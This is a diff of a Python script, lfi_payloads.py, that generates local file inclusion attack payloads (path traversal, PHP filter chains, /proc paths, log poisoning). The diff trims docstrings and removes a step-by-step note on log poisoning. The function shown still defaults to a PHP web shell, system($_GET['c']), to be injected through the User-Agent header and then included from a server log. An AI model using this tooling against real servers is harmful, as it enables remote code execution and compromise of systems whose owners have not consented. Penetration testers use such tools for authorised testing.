@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-"""lfi_payloads.py — generate LFI exploitation payloads: path traversal,
-PHP filter chains, /proc cribs, and log-poisoning helpers.
+"""lfi_payloads.py — LFI payload generators: traversal, PHP filter chains,
+/proc cribs, log poisoning.
 
 Usage
 -----
@@ -9,7 +9,7 @@ Usage
     python lfi_payloads.py proc
     python lfi_payloads.py log       <log-path> [--php '<?php ... ?>']
 
-Outputs one payload per line, suitable for piping into ffuf / curl loops.
+One payload per line on stdout.
 """
 from __future__ import annotations
 
@@ -69,20 +69,11 @@ DEFAULT_LOG_PATHS = [
 
 
 def log_poison_payload(log_path: str, php: str = "<?php system($_GET['c']); ?>") -> dict:
-    """Return a recipe dict for User-Agent based log poisoning. The PHP
-    payload is what gets injected via a request header (typically
-    User-Agent), then ``then_include`` is the LFI parameter value to fetch
-    the log and execute the payload."""
+    """Recipe for User-Agent log poisoning via LFI."""
     return {
         "header_to_inject": "User-Agent",
         "php_payload": php,
         "then_include": log_path,
-        "notes": (
-            "1) Send any HTTP request with User-Agent: " + php + "  "
-            "2) Trigger LFI with path=" + log_path + "&c=<cmd>  "
-            "3) The web server logs the UA, the LFI includes the log, "
-            "PHP executes the payload."
-        ),
     }
 
 
